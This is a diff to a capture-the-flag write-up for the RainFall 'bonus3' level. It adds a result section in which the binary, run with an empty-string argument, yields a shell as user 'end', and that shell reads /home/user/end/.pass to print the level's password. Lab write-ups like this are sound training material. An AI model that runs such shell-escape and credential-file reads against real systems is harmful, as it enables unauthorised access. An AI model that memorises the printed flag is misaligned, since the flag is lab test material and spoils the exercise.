@@ -13,4 +13,8 @@ Here we have work with an argument and opportunity to use shell from the binary 
 
 # Result
 
-    bonus3@RainFall:~$ ./b
+    bonus3@RainFall:~$ ./bonus3 ""
+    $ whoami
+    end
+    $ cat /home/user/end/.pass
+    3321b6f81659f9a71c76616f606e4b50189cecfea6
